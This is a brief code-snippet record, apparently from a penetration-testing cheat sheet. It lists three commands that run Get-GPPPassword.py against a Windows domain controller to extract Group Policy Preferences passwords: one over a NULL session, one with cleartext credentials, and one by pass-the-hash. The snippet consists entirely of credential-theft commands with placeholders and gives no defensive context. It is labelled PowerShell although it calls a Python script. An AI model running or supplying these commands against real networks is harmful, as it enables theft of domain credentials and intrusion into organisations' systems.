---
id: 0b2edd87-cf2d-4345-9173-d0b9a66f43a1
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:03.530177+00:00'
updated_at: '2023-04-10T20:26:15.125043+00:00'
---

# Code Snippet 0b2edd87

**Language**: Powershell

```powershell
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
